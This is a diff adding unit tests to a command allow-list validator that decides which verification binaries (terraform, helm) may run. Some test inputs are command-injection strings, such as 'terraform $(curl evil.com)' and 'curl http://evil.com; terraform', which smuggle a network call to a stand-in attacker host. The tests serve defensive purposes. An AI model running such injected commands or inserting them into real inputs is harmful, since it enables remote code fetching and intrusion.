@@ -282,6 +282,32 @@ describe("isVerificationCommandAllowed", () => {
   it("handles leading whitespace", () => {
     expect(isVerificationCommandAllowed("  helm lint")).toBe(true);
   });
+
+  it("rejects command with null bytes injected into binary name", () => {
+    // Null byte between binary name and space prevents startsWith match
+    expect(isVerificationCommandAllowed("terraform\0 validate")).toBe(false);
+  });
+
+  it("rejects command where null byte creates a non-whitelisted prefix", () => {
+    expect(isVerificationCommandAllowed("\0terraform validate")).toBe(false);
+  });
+
+  it("allows whitelisted binary even with shell metacharacters in args (execFileSync is safe)", () => {
+    // isVerificationCommandAllowed only checks the binary name prefix.
+    // Shell metacharacters in arguments are NOT a risk because verify() uses
+    // execFileSync which does NOT invoke a shell — metacharacters are passed
+    // as literal string arguments to the binary.
+    expect(isVerificationCommandAllowed("terraform validate; echo hi")).toBe(true);
+    expect(isVerificationCommandAllowed("terraform validate | cat")).toBe(true);
+    expect(isVerificationCommandAllowed("terraform $(curl evil.com)")).toBe(true);
+    expect(isVerificationCommandAllowed("terraform `curl evil.com`")).toBe(true);
+  });
+
+  it("rejects completely non-whitelisted binary with metacharacters", () => {
+    expect(isVerificationCommandAllowed("curl http://evil.com; terraform")).toBe(false);
+    expect(isVerificationCommandAllowed("bash -c 'terraform validate'")).toBe(false);
+    expect(isVerificationCommandAllowed("sh -c terraform")).toBe(false);
+  });
 });
 
 describe("verify() permission enforcement", () => {
